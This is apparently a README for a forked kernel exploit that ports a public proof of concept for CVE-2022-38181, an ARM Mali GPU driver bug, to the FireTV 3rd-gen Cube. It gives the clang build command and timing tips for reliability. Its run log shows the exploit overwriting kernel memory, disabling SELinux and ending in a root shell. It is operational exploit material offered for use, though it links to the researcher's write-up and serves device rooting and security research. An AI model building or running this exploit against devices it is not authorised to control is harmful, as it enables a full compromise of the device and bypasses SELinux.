## Exploit for CVE-2022-38181 to run on FireTV 3rd gen Cube

This is a fork of security researcher Man Yue Mo's <a href="https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Mali/CVE_2022_38181">Pixel 6 POC</a> for CVE_2022_38181.  Read his detailed write-up of the vulnerability <a href="https://github.blog/2023-01-23-pwning-the-all-google-phone-with-a-non-google-bug/">here</a>.  Changes have been made to account for FireOS's 32bit userspace. The POC exploits a bug in the ARM Mali kernel driver to gain arbitrary kernel code execution, which is then used to disable SELinux and gain root.  

I used the following command to compile with clang in ndk-21:
```
android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi30-clang -DSHELL mali_shrinker_mmap32.c -o gazelle_shrinker
```
The exploit should be run 30-90sec after the Cube boots for greatest reliability.
```
gazelle:/ $ /data/local/tmp/gazelle_shrinker
fingerprint: Amazon/gazelle/gazelle:9/PS7613.3701N/0025401652480:user/amz-p,release-keys
failed, retry.
failed, retry.
region freed 47
alias gpu va 100c83000
read 0
cleanup flush region
release_mem_pool
jit_freed
jit_free commit: 6 0
Found freed_idx 6
Found pgd 23, 100d30000
overwrite addr : 104100558 558
overwrite addr : 104300558 558
overwrite addr : 10410082c 82c
overwrite addr : 10430082c 82c
result 50
gazelle:/ # 
```
